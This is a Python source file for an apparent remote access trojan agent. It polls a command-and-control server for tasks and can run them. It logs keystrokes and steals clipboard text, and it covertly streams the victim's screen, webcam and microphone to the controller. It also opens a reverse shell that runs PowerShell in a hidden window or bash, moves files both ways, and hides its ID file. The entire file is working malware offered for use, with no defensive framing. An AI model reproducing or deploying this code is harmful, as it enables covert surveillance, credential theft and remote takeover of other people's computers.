import requests
import time
import uuid
import os
import subprocess
import threading
import mss
import numpy as np
import cv2
try:
    import win32api
    import win32con
    import win32clipboard
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    
import pyaudio
import base64
import tempfile
import pynput
from pynput import keyboard
import pygame
import io
import wave
import socket
import json
import asyncio
import websockets
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
import psutil
from PIL import Image

SERVER_URL = "http://localhost:8080"  # Change to your controller's URL

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Reverse Shell State ---
REVERSE_SHELL_ENABLED = False
REVERSE_SHELL_THREAD = None
REVERSE_SHELL_SOCKET = None

# --- Voice Control State ---
VOICE_CONTROL_ENABLED = False
VOICE_CONTROL_THREAD = None
VOICE_RECOGNIZER = None

# --- Monitoring State ---
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

def get_or_create_agent_id():
    """
    Gets a unique agent ID from config directory or creates it.
    """
    if WINDOWS_AVAILABLE:
        config_path = os.getenv('APPDATA')
    else:
        config_path = os.path.expanduser('~/.config')
        
    os.makedirs(config_path, exist_ok=True)
    id_file_path = os.path.join(config_path, 'agent_id.txt')
    
    if os.path.exists(id_file_path):
        with open(id_file_path, 'r') as f:
            return f.read().strip()
    else:
        agent_id = str(uuid.uuid4())
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        # Hide the file on Windows
        if WINDOWS_AVAILABLE:
            try:
                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
        return agent_id

def stream_screen(agent_id):
    """
    Captures the screen and streams it to the controller at high FPS.
    This function runs in a separate thread.
    """
    global STREAMING_ENABLED
    url = f"{SERVER_URL}/stream/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    with mss.mss() as sct:
        # Optimize for high FPS
        target_fps = 30
        frame_time = 1.0 / target_fps
        last_frame_time = time.time()
        
        while STREAMING_ENABLED:
            try:
                current_time = time.time()
                
                # Get raw pixels from the screen
                sct_img = sct.grab(sct.monitors[1])
                
                # Create an OpenCV image
                img = np.array(sct_img)
                
                # Resize for better performance if screen is too large
                height, width = img.shape[:2]
                if width > 1920:
                    scale = 1920 / width
                    new_width = int(width * scale)
                    new_height = int(height * scale)
                    img = cv2.resize(img, (new_width, new_height), interpolation=cv2.INTER_AREA)
                
                # Encode the image as JPEG with optimized quality for speed
                is_success, buffer = cv2.imencode(".jpg", img, [
                    cv2.IMWRITE_JPEG_QUALITY, 85,
                    cv2.IMWRITE_JPEG_OPTIMIZE, 1
                ])
                if not is_success:
                    continue

                # Send the frame to the controller asynchronously
                try:
                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
                except requests.exceptions.Timeout:
                    pass  # Skip frame if timeout
                
                # Maintain target FPS
                elapsed = time.time() - current_time
                sleep_time = max(0, frame_time - elapsed)
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
            except Exception as e:
                print(f"Stream error: {e}")
                time.sleep(1) # Shorter wait before retrying

def stream_camera(agent_id):
    """
    Captures the webcam and streams it to the controller at high FPS.
    This function runs in a separate thread.
    """
    global CAMERA_STREAMING_ENABLED
    url = f"{SERVER_URL}/camera/{agent_id}"
    headers = {'Content-Type': 'image/jpeg'}

    try:
        # Use CAP_DSHOW on Windows for better device compatibility and performance.
        if WINDOWS_AVAILABLE:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        else:
            cap = cv2.VideoCapture(0)
            
        if not cap.isOpened():
            print("Cannot open webcam")
            CAMERA_STREAMING_ENABLED = False
            return
            
        # Set camera properties for higher FPS
        cap.set(cv2.CAP_PROP_FPS, 30)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Reduce buffer for lower latency
        
    except Exception as e:
        print(f"Could not open webcam: {e}")
        CAMERA_STREAMING_ENABLED = False
        return

    target_fps = 30
    frame_time = 1.0 / target_fps
    
    while CAMERA_STREAMING_ENABLED:
        try:
            current_time = time.time()
            
            ret, frame = cap.read()
            if not ret:
                break
                
            # Optimize frame quality for speed
            is_success, buffer = cv2.imencode(".jpg", frame, [
                cv2.IMWRITE_JPEG_QUALITY, 85,
                cv2.IMWRITE_JPEG_OPTIMIZE, 1
            ])
            if is_success:
                try:
                    requests.post(url, data=buffer.tobytes(), headers=headers, timeout=0.5)
                except requests.exceptions.Timeout:
                    pass  # Skip frame if timeout
                    
            # Maintain target FPS
            elapsed = time.time() - current_time
            sleep_time = max(0, frame_time - elapsed)
            if sleep_time > 0:
                time.sleep(sleep_time)
                
        except Exception as e:
            print(f"Camera stream error: {e}")
            time.sleep(1)
            
    cap.release()

def stream_audio(agent_id):
    """
    Captures microphone audio and streams it to the controller.
    This function runs in a separate thread.
    """
    global AUDIO_STREAMING_ENABLED
    url = f"{SERVER_URL}/audio/{agent_id}"
    
    try:
        p = pyaudio.PyAudio()
        # --- Diagnostic: Print the default device to be used ---
        default_device_info = p.get_default_input_device_info()
        print(f"Attempting to use default audio device: {default_device_info['name']}")
        # --- End Diagnostic ---
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, input_device_index=default_device_info['index'])
    except Exception as e:
        print(f"Could not open audio stream: {e}")
        AUDIO_STREAMING_ENABLED = False
        return

    while AUDIO_STREAMING_ENABLED:
        try:
            data = stream.read(CHUNK)
            requests.post(url, data=data, timeout=1)
        except Exception as e:
            print(f"Audio stream error: {e}")
            break
    
    stream.stop_stream()
    stream.close()
    p.terminate()

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    if not STREAMING_ENABLED:
        STREAMING_ENABLED = True
        STREAM_THREAD = threading.Thread(target=stream_screen, args=(agent_id,))
        STREAM_THREAD.daemon = True
        STREAM_THREAD.start()
        print("Started video stream.")

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD
    if STREAMING_ENABLED:
        STREAMING_ENABLED = False
        if STREAM_THREAD:
            STREAM_THREAD.join(timeout=2)
        STREAM_THREAD = None
        print("Stopped video stream.")

def start_audio_streaming(agent_id):
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if not AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = True
        AUDIO_STREAM_THREAD = threading.Thread(target=stream_audio, args=(agent_id,))
        AUDIO_STREAM_THREAD.daemon = True
        AUDIO_STREAM_THREAD.start()
        print("Started audio stream.")

def stop_audio_streaming():
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREAD
    if AUDIO_STREAMING_ENABLED:
        AUDIO_STREAMING_ENABLED = False
        if AUDIO_STREAM_THREAD:
            AUDIO_STREAM_THREAD.join(timeout=2)
        AUDIO_STREAM_THREAD = None
        print("Stopped audio stream.")

def start_camera_streaming(agent_id):
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if not CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = True
        CAMERA_STREAM_THREAD = threading.Thread(target=stream_camera, args=(agent_id,))
        CAMERA_STREAM_THREAD.daemon = True
        CAMERA_STREAM_THREAD.start()
        print("Started camera stream.")

def stop_camera_streaming():
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREAD
    if CAMERA_STREAMING_ENABLED:
        CAMERA_STREAMING_ENABLED = False
        if CAMERA_STREAM_THREAD:
            CAMERA_STREAM_THREAD.join(timeout=2)
        CAMERA_STREAM_THREAD = None
        print("Stopped camera stream.")

# --- Reverse Shell Functions ---

def reverse_shell_handler(agent_id):
    """
    Handles reverse shell connections and command execution.
    This function runs in a separate thread.
    """
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_SOCKET
    
    try:
        # Create socket connection back to controller
        REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        controller_host = SERVER_URL.split("://")[1].split(":")[0]  # Extract host from SERVER_URL
        controller_port = 9999  # Dedicated port for reverse shell
        
        REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
        print(f"Reverse shell connected to {controller_host}:{controller_port}")
        
        # Send initial connection info
        system_info = {
            "agent_id": agent_id,
            "hostname": socket.gethostname(),
            "platform": os.name,
            "cwd": os.getcwd(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        }
        REVERSE_SHELL_SOCKET.send(json.dumps(system_info).encode() + b'\n')
        
        while REVERSE_SHELL_ENABLED:
            try:
                # Receive command from controller
                data = REVERSE_SHELL_SOCKET.recv(4096)
                if not data:
                    break
                    
                command = data.decode().strip()
                if not command:
                    continue
                    
                # Handle special commands
                if command.lower() == "exit":
                    break
                elif command.startswith("cd "):
                    try:
                        path = command[3:].strip()
                        os.chdir(path)
                        response = f"Changed directory to: {os.getcwd()}\n"
                    except Exception as e:
                        response = f"cd error: {str(e)}\n"
                else:
                    # Execute regular command
                    try:
                        if WINDOWS_AVAILABLE:
                            result = subprocess.run(
                                ["powershell.exe", "-NoProfile", "-Command", command],
                                capture_output=True,
                                text=True,
                                timeout=30,
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                        else:
                            result = subprocess.run(
                                ["bash", "-c", command],
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                        response = result.stdout + result.stderr
                        if not response:
                            response = "[Command executed successfully - no output]\n"
                    except subprocess.TimeoutExpired:
                        response = "[Command timed out after 30 seconds]\n"
                    except Exception as e:
                        response = f"[Command execution error: {str(e)}]\n"
                
                # Send response back
                REVERSE_SHELL_SOCKET.send(response.encode())
                
            except socket.timeout:
                continue
            except Exception as e:
                print(f"Reverse shell error: {e}")
                break
                
    except Exception as e:
        print(f"Reverse shell connection error: {e}")
    finally:
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        REVERSE_SHELL_SOCKET = None
        print("Reverse shell disconnected")

def start_reverse_shell(agent_id):
    """Start the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD
    if not REVERSE_SHELL_ENABLED:
        REVERSE_SHELL_ENABLED = True
        REVERSE_SHELL_THREAD = threading.Thread(target=reverse_shell_handler, args=(agent_id,))
        REVERSE_SHELL_THREAD.daemon = True
        REVERSE_SHELL_THREAD.start()
        print("Started reverse shell.")

def stop_reverse_shell():
    """Stop the reverse shell connection."""
    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_THREAD, REVERSE_SHELL_SOCKET
    if REVERSE_SHELL_ENABLED:
        REVERSE_SHELL_ENABLED = False
        if REVERSE_SHELL_SOCKET:
            try:
                REVERSE_SHELL_SOCKET.close()
            except:
                pass
        if REVERSE_SHELL_THREAD:
            REVERSE_SHELL_THREAD.join(timeout=2)
        REVERSE_SHELL_THREAD = None
        print("Stopped reverse shell.")

# --- Voice Control Functions ---

def voice_control_handler(agent_id):
    """
    Handles voice recognition and command processing.
    This function runs in a separate thread.
    """
    global VOICE_CONTROL_ENABLED, VOICE_RECOGNIZER
    
    if not SPEECH_RECOGNITION_AVAILABLE:
        print("Speech recognition not available - install speechrecognition library")
        return
    
    VOICE_RECOGNIZER = sr.Recognizer()
    microphone = sr.Microphone()
    
    # Adjust for ambient noise
    with microphone as source:
        print("Adjusting for ambient noise... Please wait.")
        VOICE_RECOGNIZER.adjust_for_ambient_noise(source)
        print("Voice control ready. Listening for commands...")
    
    while VOICE_CONTROL_ENABLED:
        try:
            with microphone as source:
                # Listen for audio with timeout
                audio = VOICE_RECOGNIZER.listen(source, timeout=1, phrase_time_limit=5)
            
            try:
                # Recognize speech using Google Speech Recognition
                command = VOICE_RECOGNIZER.recognize_google(audio).lower()
                print(f"Voice command received: {command}")
                
                # Process voice commands
                if "screenshot" in command or "screen shot" in command:
                    execute_voice_command("screenshot", agent_id)
                elif "open camera" in command or "start camera" in command:
                    execute_voice_command("start-camera", agent_id)
                elif "close camera" in command or "stop camera" in command:
                    execute_voice_command("stop-camera", agent_id)
                elif "start streaming" in command or "start stream" in command:
                    execute_voice_command("start-stream", agent_id)
                elif "stop streaming" in command or "stop stream" in command:
                    execute_voice_command("stop-stream", agent_id)
                elif "system info" in command or "system information" in command:
                    execute_voice_command("systeminfo", agent_id)
                elif "list processes" in command or "show processes" in command:
                    if WINDOWS_AVAILABLE:
                        execute_voice_command("Get-Process | Select-Object Name, Id | Format-Table", agent_id)
                    else:
                        execute_voice_command("ps aux", agent_id)
                elif "current directory" in command or "where am i" in command:
                    execute_voice_command("pwd", agent_id)
                elif command.startswith("run ") or command.startswith("execute "):
                    # Extract command after "run" or "execute"
                    actual_command = command.split(" ", 1)[1] if " " in command else ""
                    if actual_command:
                        execute_voice_command(actual_command, agent_id)
                else:
                    print(f"Unknown voice command: {command}")
                    
            except sr.UnknownValueError:
                # Speech not recognized - this is normal, just continue
                pass
            except sr.RequestError as e:
                print(f"Could not request results from speech recognition service: {e}")
                time.sleep(1)
                
        except sr.WaitTimeoutError:
            # Timeout waiting for audio - this is normal, just continue
            pass
        except Exception as e:
            print(f"Voice control error: {e}")
            time.sleep(1)

def execute_voice_command(command, agent_id):
    """Execute a command received via voice control."""
    try:
        # Send command to controller for execution
        url = f"{SERVER_URL}/voice_command/{agent_id}"
        response = requests.post(url, json={"command": command}, timeout=5)
        print(f"Voice command '{command}' sent to controller")
    except Exception as e:
        print(f"Error sending voice command: {e}")

def start_voice_control(agent_id):
    """Start voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    if not VOICE_CONTROL_ENABLED:
        VOICE_CONTROL_ENABLED = True
        VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,))
        VOICE_CONTROL_THREAD.daemon = True
        VOICE_CONTROL_THREAD.start()
        print("Started voice control.")

def stop_voice_control():
    """Stop voice control functionality."""
    global VOICE_CONTROL_ENABLED, VOICE_CONTROL_THREAD
    if VOICE_CONTROL_ENABLED:
        VOICE_CONTROL_ENABLED = False
        if VOICE_CONTROL_THREAD:
            VOICE_CONTROL_THREAD.join(timeout=2)
        VOICE_CONTROL_THREAD = None
        print("Stopped voice control.")

# --- Keylogger Functions ---

def on_key_press(key):
    """Callback for key press events."""
    global KEYLOG_BUFFER
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Regular character
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: '{key.char}'")
        else:
            # Special key
            KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [{key}]")
    except Exception as e:
        KEYLOG_BUFFER.append(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: [ERROR: {e}]")

def keylogger_worker(agent_id):
    """Keylogger worker thread that sends data periodically."""
    global KEYLOGGER_ENABLED, KEYLOG_BUFFER
    url = f"{SERVER_URL}/keylog_data/{agent_id}"
    
    while KEYLOGGER_ENABLED:
        try:
            if KEYLOG_BUFFER:
                # Send accumulated keylog data
                data_to_send = KEYLOG_BUFFER.copy()
                KEYLOG_BUFFER = []
                
                for entry in data_to_send:
                    requests.post(url, json={"data": entry}, timeout=5)
            
            time.sleep(5)  # Send data every 5 seconds
        except Exception as e:
            print(f"Keylogger error: {e}")
            time.sleep(5)

def start_keylogger(agent_id):
    """Start the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if not KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = True
        
        # Start keyboard listener
        listener = keyboard.Listener(on_press=on_key_press)
        listener.daemon = True
        listener.start()
        
        # Start worker thread
        KEYLOGGER_THREAD = threading.Thread(target=keylogger_worker, args=(agent_id,))
        KEYLOGGER_THREAD.daemon = True
        KEYLOGGER_THREAD.start()
        
        print("Started keylogger.")

def stop_keylogger():
    """Stop the keylogger."""
    global KEYLOGGER_ENABLED, KEYLOGGER_THREAD
    if KEYLOGGER_ENABLED:
        KEYLOGGER_ENABLED = False
        if KEYLOGGER_THREAD:
            KEYLOGGER_THREAD.join(timeout=2)
        KEYLOGGER_THREAD = None
        print("Stopped keylogger.")

# --- Clipboard Monitor Functions ---

def get_clipboard_content():
    """Get current clipboard content."""
    if WINDOWS_AVAILABLE:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except:
            try:
                win32clipboard.CloseClipboard()
            except:
                pass
            return None
    else:
        # On Linux, we'll skip clipboard monitoring for now
        return None

def clipboard_monitor_worker(agent_id):
    """Clipboard monitor worker thread."""
    global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
    url = f"{SERVER_URL}/clipboard_data/{agent_id}"
    
    while CLIPBOARD_MONITOR_ENABLED:
        try:
            current_content = get_clipboard_content()
            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
                
                requests.post(url, json={"data": clipboard_entry}, timeout=5)
                LAST_CLIPBOARD_CONTENT = current_content
            
            time.sleep(2)  # Check clipboard every 2 seconds
        except Exception as e:
            print(f"Clipboard monitor error: {e}")
            time.sleep(2)

def start_clipboard_monitor(agent_id):
    """Start clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if not CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = True
        CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
        CLIPBOARD_MONITOR_THREAD.daemon = True
        CLIPBOARD_MONITOR_THREAD.start()
        print("Started clipboard monitor.")

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global CLIPBOARD_MONITOR_ENABLED, CLIPBOARD_MONITOR_THREAD
    if CLIPBOARD_MONITOR_ENABLED:
        CLIPBOARD_MONITOR_ENABLED = False
        if CLIPBOARD_MONITOR_THREAD:
            CLIPBOARD_MONITOR_THREAD.join(timeout=2)
        CLIPBOARD_MONITOR_THREAD = None
        print("Stopped clipboard monitor.")

# --- File Management Functions ---

def handle_file_upload(command_parts):
    """Handle file upload from controller."""
    try:
        if len(command_parts) < 3:
            return "Invalid upload command format"
        
        destination_path = command_parts[1]
        file_content_b64 = command_parts[2]
        
        # Decode base64 content
        file_content = base64.b64decode(file_content_b64)
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            f.write(file_content)
        
        return f"File uploaded successfully to {destination_path}"
    except Exception as e:
        return f"File upload failed: {e}"

def handle_file_download(command_parts, agent_id):
    """Handle file download request from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid download command format"
        
        file_path = command_parts[1]
        
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        
        # Read file and encode as base64
        with open(file_path, 'rb') as f:
            file_content = base64.b64encode(f.read()).decode('utf-8')
        
        # Send file to controller
        filename = os.path.basename(file_path)
        url = f"{SERVER_URL}/file_upload/{agent_id}"
        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
        
        return f"File {file_path} sent to controller"
    except Exception as e:
        return f"File download failed: {e}"

# --- Voice Communication Functions ---

def handle_voice_playback(command_parts):
    """Handle voice playback from controller."""
    try:
        if len(command_parts) < 2:
            return "Invalid voice command format"
        
        audio_content_b64 = command_parts[1]
        
        # Decode base64 audio
        audio_content = base64.b64decode(audio_content_b64)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_file.write(audio_content)
            temp_audio_path = temp_file.name
        
        # Initialize pygame mixer for audio playback
        pygame.mixer.init()
        pygame.mixer.music.load(temp_audio_path)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)
        
        # Clean up
        pygame.mixer.quit()
        os.unlink(temp_audio_path)
        
        return "Voice message played successfully"
    except Exception as e:
        return f"Voice playback failed: {e}"

def execute_command(command):
    """Executes a command and returns its output."""
    try:
        if WINDOWS_AVAILABLE:
            # Explicitly use PowerShell to execute commands on Windows
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            # Use bash on Linux/Unix systems
            result = subprocess.run(
                ["bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=30
            )
        output = result.stdout + result.stderr
        if not output:
            return "[No output from command]"
        return output
    except Exception as e:
        return f"Command execution failed: {e}"

def main_loop(agent_id):
    """The main command and control loop."""
    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
        "start-keylogger": lambda: start_keylogger(agent_id),
        "stop-keylogger": stop_keylogger,
        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
        "stop-clipboard": stop_clipboard_monitor,
        "start-reverse-shell": lambda: start_reverse_shell(agent_id),
        "stop-reverse-shell": stop_reverse_shell,
        "start-voice-control": lambda: start_voice_control(agent_id),
        "stop-voice-control": stop_voice_control,
    }

    while True:
        try:
            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
            task = response.json()
            command = task.get("command", "sleep")

            if command in internal_commands:
                internal_commands[command]()
            elif command.startswith("upload-file:"):
                output = handle_file_upload(command.split(":", 2))
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
            elif command.startswith("download-file:"):
                output = handle_file_download(command.split(":", 1), agent_id)
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
            elif command.startswith("play-voice:"):
                output = handle_voice_playback(command.split(":", 1))
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
            elif command != "sleep":
                output = execute_command(command)
                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
        
        except requests.exceptions.RequestException:
            # This is expected when the server is down, just wait and retry
            pass
        
        # Adaptive sleep to reduce traffic when idle
        sleep_time = 1 if (STREAMING_ENABLED or AUDIO_STREAMING_ENABLED or 
                          CAMERA_STREAMING_ENABLED or KEYLOGGER_ENABLED or 
                          CLIPBOARD_MONITOR_ENABLED or REVERSE_SHELL_ENABLED or
                          VOICE_CONTROL_ENABLED) else 5
        time.sleep(sleep_time)

if __name__ == "__main__":
    agent_id = get_or_create_agent_id()
    print(f"Agent starting with ID: {agent_id}")
    try:
        main_loop(agent_id)
    except KeyboardInterrupt:
        print("\nAgent shutting down.")
        stop_streaming()
        stop_audio_streaming()
        stop_camera_streaming()
        stop_keylogger()
        stop_clipboard_monitor()
        stop_reverse_shell()
        stop_voice_control()